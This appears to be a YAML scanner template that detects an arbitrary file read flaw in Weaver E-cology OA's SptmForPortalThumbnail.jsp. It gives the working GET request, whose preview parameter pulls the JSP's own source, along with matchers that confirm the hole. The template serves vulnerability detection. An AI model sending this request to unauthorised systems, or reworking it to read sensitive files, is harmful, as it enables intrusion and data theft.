id: "weaver-sptmforportalthumbnail-lfi"
name: "OA E-Weaver SptmForPortalThumbnail - Arbitrary File Read"
severity: "high"
description: "The controllable preview parameters of SptmForPortalThumbnail.jsp are not filtered and are directly spliced to the web root directory for file downloading."
tech:
  - "tomcat"
  - "java"
tags:
  - "weaver"
  - "e-cology"
  - "oa"
  - "lfi"
  - "vuln"
reference: "http://124.223.89.192/archives/e-cology8-14"
spaExclusion: true
request:
  method: "GET"
  path: "/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "weaver.general.BaseBean"
      - "getServletConfig"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "image/png"
  - type: "status"
    status:
      - 200
